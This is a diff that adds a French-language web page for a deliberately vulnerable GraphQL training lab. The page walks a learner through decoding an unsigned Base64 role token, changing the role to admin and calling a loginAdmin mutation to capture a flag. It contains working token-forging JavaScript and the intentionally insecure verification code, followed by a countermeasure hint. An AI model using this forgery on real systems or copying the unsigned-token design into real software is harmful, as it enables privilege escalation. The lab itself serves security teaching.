@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Scénario 3 — Auth Bypass</title>
+<style>
+  :root { --bg-global:#0B0F14; --bg-header:#0F1A2B; --bg-card:#141B26; --btn-primary:#D41414; --btn-primary-hover:#FF2A2A; --glow-color:#00C2FF; --text-primary:#F2F4F8; --text-secondary:#8A8F98; --border:#1E2A3A; }
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body { background:var(--bg-global); color:var(--text-primary); font-family:'Segoe UI',system-ui,sans-serif; min-height:100vh; }
+  header { background:var(--bg-header); border-bottom:1px solid var(--border); padding:1rem 2rem; display:flex; align-items:center; gap:1rem; }
+  header a { color:var(--glow-color); text-decoration:none; font-size:0.85rem; }
+  main { max-width:950px; margin:0 auto; padding:2rem; }
+  h2 { font-size:1.6rem; margin-bottom:0.5rem; }
+  h2 span { color:var(--glow-color); }
+  .subtitle { color:var(--text-secondary); margin-bottom:2rem; line-height:1.6; }
+  .theory { background:var(--bg-card); border:1px solid var(--border); border-radius:12px; padding:1.5rem; margin-bottom:1.5rem; }
+  .theory h3 { color:var(--glow-color); margin-bottom:0.8rem; }
+  .theory p { color:var(--text-secondary); font-size:0.88rem; line-height:1.6; }
+  .panel { background:var(--bg-card); border:1px solid var(--border); border-radius:12px; padding:1.5rem; margin-bottom:1.5rem; }
+  .panel h3 { color:var(--glow-color); margin-bottom:1rem; }
+  .code { background:#0a0a0a; border:1px solid #222; border-left:3px solid var(--btn-primary); border-radius:6px; padding:1rem; font-family:'Courier New',monospace; font-size:0.8rem; margin:0.8rem 0; overflow-x:auto; white-space:pre; color:#a0f0a0; }
+  label { display:block; font-size:0.85rem; color:var(--text-secondary); margin-bottom:0.4rem; margin-top:0.8rem; }
+  input { width:100%; background:#0F1A2B; border:1px solid var(--border); color:var(--text-primary); padding:0.6rem 0.8rem; border-radius:6px; font-size:0.9rem; }
+  .btn { background:var(--btn-primary); color:white; padding:0.65rem 1.4rem; border-radius:6px; font-weight:600; font-size:0.9rem; cursor:pointer; border:none; width:100%; margin-top:1rem; transition:background 0.2s; }
+  .btn:hover { background:var(--btn-primary-hover); }
+  .btn-ghost { background:#1A2A3A; color:var(--glow-color); border:1px solid var(--border); }
+  .result { margin-top:1rem; padding:1rem; border-radius:8px; font-size:0.85rem; display:none; word-break:break-all; }
+  .result.success { background:#001A15; border:1px solid #00AA77; color:#00FF99; display:block; }
+  .result.error { background:#1A0000; border:1px solid #AA0000; color:#FF6666; display:block; }
+  .result.info { background:#001220; border:1px solid #003366; color:#66AAFF; display:block; }
+  .flag { background:#001A15; border:1px solid #00AA77; border-radius:8px; padding:1rem; margin-top:1rem; font-family:monospace; color:#00FF99; font-size:1rem; text-align:center; display:none; }
+  .hint { background:#1A1500; border:1px solid #554400; border-radius:8px; padding:1rem; margin-top:1rem; font-size:0.82rem; color:#FFCC44; }
+  .layout { display:grid; grid-template-columns:1fr 1fr; gap:1.5rem; }
+  .token-display { background:#0a0a0a; border:1px solid #222; border-radius:6px; padding:0.8rem; font-family:'Courier New',monospace; font-size:0.75rem; color:#FFB800; word-break:break-all; min-height:50px; margin-top:0.5rem; }
+  .step-badge { display:inline-block; background:var(--btn-primary); color:white; width:24px; height:24px; border-radius:50%; text-align:center; line-height:24px; font-size:0.8rem; font-weight:bold; margin-right:0.5rem; }
+</style>
+</head>
+<body>
+<header>
+  <a href="/">← Retour au lab</a>
+  <h1 style="font-size:1.2rem;">🕸️ Scénario 3 — <span style="color:var(--glow-color)">Auth Bypass via Mutation</span></h1>
+</header>
+<main>
+  <h2>GraphQL <span>Auth Bypass</span></h2>
+  <p class="subtitle">La mutation <code>login</code> retourne un token encodé en Base64 contenant le rôle de l'utilisateur. Le serveur fait confiance à ce token sans vérification cryptographique. Il suffit de modifier le rôle dans le token pour obtenir un accès admin.</p>
+
+  <div class="theory">
+    <h3>📚 Le mécanisme vulnérable</h3>
+    <p>Le serveur génère un token ainsi :</p>
+    <div class="code">// Génération (côté serveur)
+const token = Buffer.from(JSON.stringify({ id: user.id, role: user.role })).toString('base64');
+
+// Vérification (VULNÉRABLE : pas de signature !)
+const decoded = JSON.parse(Buffer.from(token, 'base64').toString());
+if (decoded.role === 'admin') { /* accès accordé */ }</div>
+    <p style="margin-top:0.5rem;">Sans signature cryptographique, n'importe qui peut modifier le token. C'est exactement la même faille que JWT avec <code>alg:none</code> — mais appliquée à GraphQL.</p>
+  </div>
+
+  <div class="layout">
+    <div class="panel">
+      <h3><span class="step-badge">1</span>Se connecter</h3>
+      <label>Utilisateur</label>
+      <input type="text" id="s3-user" value="alice">
+      <label>Mot de passe</label>
+      <input type="password" id="s3-pass" value="alice123">
+      <button class="btn" onclick="s3Login()">Se connecter via GraphQL</button>
+      <div class="result" id="s3-login-result"></div>
+      <p style="font-size:0.82rem; color:var(--text-secondary); margin-top:0.8rem;">Token reçu :</p>
+      <div class="token-display" id="s3-token-display">—</div>
+    </div>
+
+    <div class="panel">
+      <h3><span class="step-badge">2</span>Décoder et modifier le token</h3>
+      <p style="font-size:0.85rem; color:var(--text-secondary); margin-bottom:0.8rem;">Décodez le token Base64 et changez le rôle à <code>admin</code> :</p>
+      <label>Token original</label>
+      <input type="text" id="s3-original-token" placeholder="Token reçu...">
+      <button class="btn btn-ghost" onclick="s3Decode()">🔍 Décoder</button>
+      <div class="result" id="s3-decode-result"></div>
+      <button class="btn" onclick="s3Forge()" style="margin-top:0.5rem;">🔧 Forger token admin</button>
+      <p style="font-size:0.82rem; color:var(--text-secondary); margin-top:0.8rem;">Token forgé :</p>
+      <div class="token-display" id="s3-forged-display">—</div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <h3><span class="step-badge">3</span>Utiliser le token forgé pour accéder à l'admin</h3>
+    <label>Token forgé (rôle: admin)</label>
+    <input type="text" id="s3-forged-token" placeholder="Token forgé...">
+    <button class="btn" onclick="s3Attack()">🚀 loginAdmin avec token forgé</button>
+    <p style="font-size:0.82rem; color:var(--text-secondary); margin-top:0.8rem;">Requête GraphQL envoyée :</p>
+    <div class="code" id="s3-mutation-display">mutation { loginAdmin(token: "...") { success flag message user { username role } } }</div>
+    <div class="result" id="s3-attack-result"></div>
+    <div class="flag" id="flag3"></div>
+  </div>
+
+  <div class="hint">💡 <strong>Contre-mesure :</strong> Toujours signer les tokens (JWT avec HMAC ou RSA). Ne jamais faire confiance à des données contrôlées par le client sans vérification cryptographique. Utiliser des sessions côté serveur pour les données sensibles.</div>
+</main>
+
+<script>
+async function graphql(query) {
+  const res = await fetch('/graphql', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ query }) });
+  return res.json();
+}
+
+async function s3Login() {
+  const user = document.getElementById('s3-user').value;
+  const pass = document.getElementById('s3-pass').value;
+  const data = await graphql(`mutation { login(username: "${user}", password: "${pass}") { success token message user { username role } } }`);
+  const el = document.getElementById('s3-login-result');
+  const res = data.data.login;
+  if (res.success) {
+    el.className = 'result success';
+    el.textContent = `✅ Connecté en tant que "${res.user.username}" (rôle: ${res.user.role})`;
+    document.getElementById('s3-token-display').textContent = res.token;
+    document.getElementById('s3-original-token').value = res.token;
+  } else {
+    el.className = 'result error';
+    el.textContent = '❌ ' + res.message;
+  }
+}
+
+function s3Decode() {
+  const token = document.getElementById('s3-original-token').value.trim();
+  if (!token) { alert('Connectez-vous d\'abord !'); return; }
+  try {
+    const decoded = JSON.parse(atob(token));
+    const el = document.getElementById('s3-decode-result');
+    el.className = 'result info';
+    el.textContent = `Contenu décodé :\n${JSON.stringify(decoded, null, 2)}\n\n→ Le rôle "${decoded.role}" est stocké en clair dans le token !`;
+  } catch(e) {
+    document.getElementById('s3-decode-result').className = 'result error';
+    document.getElementById('s3-decode-result').textContent = 'Erreur de décodage';
+  }
+}
+
+function s3Forge() {
+  const token = document.getElementById('s3-original-token').value.trim();
+  if (!token) { alert('Entrez le token original !'); return; }
+  try {
+    const decoded = JSON.parse(atob(token));
+    decoded.role = 'admin'; // ← Modification du rôle
+    const forged = btoa(JSON.stringify(decoded));
+    document.getElementById('s3-forged-display').textContent = forged;
+    document.getElementById('s3-forged-token').value = forged;
+    document.getElementById('s3-mutation-display').textContent = `mutation { loginAdmin(token: "${forged}") { success flag message user { username role } } }`;
+  } catch(e) {
+    alert('Erreur: ' + e.message);
+  }
+}
+
+async function s3Attack() {
+  const token = document.getElementById('s3-forged-token').value.trim();
+  if (!token) { alert('Forgez d\'abord le token !'); return; }
+  const data = await graphql(`mutation { loginAdmin(token: "${token}") { success flag message user { username role salary } } }`);
+  const res = data.data.loginAdmin;
+  const el = document.getElementById('s3-attack-result');
+  if (res.success) {
+    el.className = 'result success';
+    el.innerHTML = `✅ ${res.message}\nUtilisateur: ${res.user.username} | Rôle: ${res.user.role} | Salaire: ${res.user.salary}€`;
+    const flag = document.getElementById('flag3');
+    flag.style.display = 'block';
+    flag.textContent = '🏴 ' + res.flag;
+  } else {
+    el.className = 'result error';
+    el.textContent = '❌ ' + res.message;
+  }
+}
+</script>
+</body>
+</html>
